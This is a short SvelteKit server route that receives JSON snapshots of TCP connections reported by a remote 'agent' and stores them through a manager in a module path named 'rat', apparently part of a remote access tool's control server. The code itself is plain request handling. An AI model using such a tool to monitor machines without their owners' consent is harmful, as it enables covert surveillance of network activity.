import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { tcpConnectionsManager, TcpConnectionsError } from '$lib/server/rat/tcp-connections';
import type { TcpConnectionSnapshotEnvelope } from '$lib/types/tcp-connections';

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: TcpConnectionSnapshotEnvelope;
	try {
		payload = (await request.json()) as TcpConnectionSnapshotEnvelope;
	} catch {
		throw error(400, 'Invalid TCP connections snapshot payload');
	}

	try {
		const snapshot = tcpConnectionsManager.ingestSnapshot(id, payload);
		return json({ accepted: true, count: snapshot.connections.length });
	} catch (err) {
		if (err instanceof TcpConnectionsError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to ingest TCP connections snapshot');
	}
};
